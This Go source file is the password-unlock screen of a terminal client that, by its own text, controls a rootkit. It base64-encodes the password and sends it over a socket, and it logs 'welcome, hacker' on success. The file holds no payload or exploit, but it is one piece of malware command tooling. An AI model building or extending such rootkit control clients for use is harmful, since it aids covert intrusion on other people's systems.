package model

import (
	"encoding/base64"
	"fmt"
	"strings"
	"time"

	"cli/server"

	"github.com/charmbracelet/bubbles/textinput"
	tea "github.com/charmbracelet/bubbletea"
)

type PasswordModel struct {
	srv       *server.Server
	locked    *bool
	isLoading *bool
	logs      *LogsModel
	isDoing   *bool
	prompt    *textinput.Model
}

type (
	PasswordStartCmd int
	PasswordDoneCmd  int
)

const (
	LOCKED   = '1'
	UNLOCKED = '0'
)

func NewPasswordModel(cfg TabCfg) *PasswordModel {
	b := false
	ti := textinput.New()
	ti.Placeholder = "Input password"
	ti.Focus()
	ti.CharLimit = 156
	ti.Width = *cfg.width - 12
	ti.PromptStyle.Height(1)
	h := PasswordModel{
		srv:       cfg.srv,
		locked:    cfg.locked,
		isLoading: cfg.isLoading,
		isDoing:   &b,
		logs:      cfg.logs,
		prompt:    &ti,
	}

	return &h
}

func (m PasswordModel) Init() tea.Cmd {
	return nil
}

func (m PasswordModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	var cmds []tea.Cmd
	switch msg := msg.(type) {
	case tea.KeyMsg:
		if msg.String() == "enter" {
			password := m.prompt.Value()
			if !*m.isLoading && !*m.isDoing && password != "" {
				cmds = append(cmds, tea.Sequence(m.startPasswordCmd(password), m.waitForPasswordResultCmd))
				m.prompt.Reset()
			} else {
				m.logs.Append("password: another command is already running\n")
			}
		} else {
			var cmd tea.Cmd
			*m.prompt, cmd = m.prompt.Update(msg)
			cmds = append(cmds, cmd)
		}
	}
	return m, tea.Batch(cmds...)
}

func (m PasswordModel) View() string {
	if m.srv.ConnState != server.Connected {
		return "Not connected.\n"
	}
	s := strings.Builder{}

	s.WriteString("\n\n\t\t\tRootkit is locked. A password is required\n\n\n")
	s.WriteString(m.prompt.View())

	return s.String()
}

func (m PasswordModel) startPasswordCmd(password string) tea.Cmd {
	return func() tea.Msg {
		if *m.isLoading || m.srv.ConnState != server.Connected {
			m.logs.Append("Password: not connected\n")
			return nil
		}

		if password == "" {
			m.logs.Append("password: no input")
			return nil
		}

		enc := base64.StdEncoding
		encoded := enc.EncodeToString([]byte(password))

		conn := *m.srv.Sock
		_, err := fmt.Fprintf(conn, "5 %s\n", encoded)
		if err != nil {
			return ConnectionUpdateMsg(server.Disconnected)
		}

		*m.isDoing = true
		*m.isLoading = true
		return PasswordStartCmd(1)
	}
}

func (m *PasswordModel) waitForPasswordResultCmd() tea.Msg {
	if !*m.isDoing {
		return nil
	}
	ch := m.srv.Channel
	timer := time.NewTimer(10 * time.Second)
loop:
	for {
		select {
		case msg, ok := <-ch:
			if ok {
				l := msg[0]
				switch l {
				case UNLOCKED:
					*m.locked = false
					m.logs.Append("password: welcome, hacker😈\n")
				case LOCKED:
					*m.locked = true
					m.logs.Append("password: incorrect password❌\n")
				default:
					*m.locked = true
					m.logs.Append(fmt.Sprintf("password: couldn't determine lock status: %v\n", msg))
				}
			} else {
				m.logs.Append("password not ok\n")
			}
			break loop
		case <-timer.C:
			m.logs.Append("password timed out\n")
			break loop
		}
	}
	*m.isLoading = false
	*m.isDoing = false
	return PasswordDoneCmd(1)
}
